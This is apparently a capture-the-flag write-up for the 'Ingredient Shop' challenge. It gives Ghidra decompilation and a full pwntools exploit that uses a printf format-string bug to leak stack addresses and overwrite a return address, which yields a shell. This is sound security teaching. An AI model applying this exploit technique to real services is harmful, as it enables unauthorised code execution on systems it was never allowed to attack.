# The Ingredient Shop

Co-authors: @Rosayxy

```
Difficulty: Medium
Author: Migsej

Brunnerne buys their ingredients from a very sketchy shop. I think they may have included an extra function by mistake.
```

Decompiled via Ghidra:

```c


void main(void)

{
  do {
    get_input();
  } while( true );
}


void get_input(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Welcome to the Brunnerne ingredient shop.");
  puts("0) Butter");
  puts("1) Sugar");
  puts("2) Flour");
  puts("3) exit");
  fgets(local_118,0x100,stdin);
  puts("here is your choice");
  printf(local_118);
  puts("");
  iVar1 = atoi(local_118);
  if (iVar1 < 1) {
    iVar1 = -iVar1;
  }
  if (iVar1 == 3) {
    exit_program();
    goto code_r0x00101332;
  }
  if (iVar1 < 4) {
    if (iVar1 == 2) {
      flour();
      goto code_r0x00101332;
    }
    if (iVar1 < 3) {
      if (iVar1 == 0) {
        butter();
        goto code_r0x00101332;
      }
      if (iVar1 == 1) {
        sugar();
        goto code_r0x00101332;
      }
    }
  }
  puts("Invalid choice");
code_r0x00101332:
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



void print_flag(void)

{
  system("/bin/sh");
  return;
}
```

There is a printf vulerability:

```c
  char local_118 [264];
  fgets(local_118,0x100,stdin);
  puts("here is your choice");
  printf(local_118);
```

We can use printf to override return address to `print_flag`.

First step, we need to recover data on the stack:

```python
p.sendline(b"%lx," * 50)
```

Response:

```
55fa746ed2a0,0,7f4675aa28e0,0,
0,2400000,2,2c786c252c786c25,
2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,
2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,
2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,
2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,
2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,
2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,
a,0,0,0,
0,0,0,0,
7752254b33b4d400,7ffdb9c8b7b0,55fa682f8351,1,
7f46758e4ca8,7ffdb9c8b8b0,55fa682f8348,1682f7040,
7ffdb9c8b8c8,7ffdb9c8b8c8,
```

We can see:

1. `2c786c252c786c25`: our `%lx,%lx,` string in hex
2. `7ffdb9c8b7b0` is the saved rbp
3. `55fa682f8351` is the saved return address

According to Ghidra, the expected return address is `0x1351`:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:001010c4(*), 00102110, 
                                                                                          00102264(*)  
        00101348 55              PUSH       RBP
        00101349 48 89 e5        MOV        RBP,RSP
                             LAB_0010134c                                    XREF[1]:     00101351(j)  
        0010134c e8 ae fe        CALL       get_input                                        undefined get_input()
                 ff ff
        00101351 eb f9           JMP        LAB_0010134c
```

So we know that the process base is `0x55fa682f8351 - 0x1351`. We want to override this to `print_flag`, which is process `base + 0x1199`.

Where is it stored? From the prologue of `get_input` and `main`:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:001010c4(*), 00102110, 
                                                                                          00102264(*)  
        00101348 55              PUSH       RBP
        00101349 48 89 e5        MOV        RBP,RSP
                             LAB_0010134c                                    XREF[1]:     00101351(j)  
        0010134c e8 ae fe        CALL       get_input                                        undefined get_input()
                 ff ff
        00101351 eb f9           JMP        LAB_0010134c
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined get_input()
             undefined         <UNASSIGNED>   <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     00101213(W), 
                                                                                                   00101332(R)  
             undefined         Stack[-0x118   local_118                               XREF[3]:     0010126b(*), 
                                                                                                   0010128e(*), 
                                                                                                   001012b1(*)  
             undefined4        Stack[-0x11c   local_11c                               XREF[7]:     001012c7(W), 
                                                                                                   001012cd(R), 
                                                                                                   001012d6(R), 
                                                                                                   001012df(R), 
                                                                                                   001012e8(R), 
                                                                                                   001012f1(R), 
                                                                                                   001012fa(R)  
                             get_input                                       XREF[4]:     Entry Point(*), main:0010134c(c), 
                                                                                          00102108, 00102244(*)  
        001011ff 55              PUSH       RBP
        00101200 48 89 e5        MOV        RBP,RSP
```

The saved rbp minus 8 points to return address. So we want to write data to rbp-8 to override the return address.

Relevant code:

```python
short = print_flag & 0xffff
target = rbp - 8
# write short to target
p.sendline(f"%{short:05}c%10$hnAAA".encode() + p64(target))
```

We write the lowest 16 bits of `print_flag` to `rbp-8` via:

1. `%{short:05}c`: print characters of length `short`, which equals to `print_flag & 0xffff`
2. `%10$hn`: write the printed character count as 16-bit integer to the 10th parameter
3. `AAA`: padding to make `p64(target)` goes to 10th parameter
4. `p64(target)`: saves the target address in the 10th parameter

How do we know it is the 10th parameter? Previously, the output was:

```
55fa746ed2a0,0,7f4675aa28e0,0,
0,2400000,2,2c786c252c786c25,
2c786c252c786c25,2c786c252c786c25
```

Our format strings starts at the 8th parameter. Now, the parameter looks like:

```
55fa746ed2a0,0,7f4675aa28e0,0,
0,2400000,2,hex of "%{short:05}c%",
hex of "10$hnAAA",p64(target)
```

So `p64(target)` becomes the 10-th parameter. Printf will write `print_flag & 0xffff` to `rbp-8`, which belongs to the return address.

However, it does not work due to unaligned stack and it crashes in `system("/bin/sh")`. We can jump over `PUSH RBP` to fix it:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined print_flag()
             undefined         <UNASSIGNED>   <RETURN>
                             print_flag                                      XREF[3]:     Entry Point(*), 001020e0, 
                                                                                          001021a8(*)  
        00101199 55              PUSH       RBP
        0010119a 48 89 e5        MOV        RBP,RSP
        0010119d 48 8d 05        LEA        RAX,[s_/bin/sh_00102008]                         = "/bin/sh"
                 64 0e 00 00
        001011a4 48 89 c7        MOV        RDI=>s_/bin/sh_00102008,RAX                      = "/bin/sh"
        001011a7 e8 a4 fe        CALL       <EXTERNAL>::system                               int system(char * __command)
                 ff ff
        001011ac 90              NOP
        001011ad 5d              POP        RBP
        001011ae c3              RET
```

So we need to jump to `print_flag + 1`, not `print_flag`.

The whole attack script:

```python
from pwn import *

e = ELF("./shop")
p = remote("the-ingredient-shop-a2f5979a5fee57ae.challs.brunnerne.xyz", 443, ssl=True)
# p = e.process()

context.binary = e
context.terminal = ["tmux", "split-w", "-h"]
context(arch="amd64", os="linux", log_level="debug")

# gdb.attach(p)
# pause()

p.recvuntil("shop")
p.sendline(b"%lx," * 50)
recv = p.recvuntil("butter").splitlines()[-3]
rbp = int(recv.split(b",")[41], 16)
print("rbp", hex(rbp))
addr = int(recv.split(b",")[42], 16)
print("return address", hex(addr))
base = addr - 0x1351
print("proc base", hex(base))
print_flag = base + e.symbols["print_flag"]
print("print_flag", hex(print_flag))

p.recvuntil("shop")
short = (print_flag + 0x1) & 0xffff
target = rbp - 8
# write short to target
p.sendline(f"%{short:05}c%10$hnAAA".encode() + p64(target))

p.interactive()
```

After we get the shell, the flag is found at `/flag.txt`: `brunner{these_people_need_to_get_better_at_security}`.

Credits to @Rosayxy.
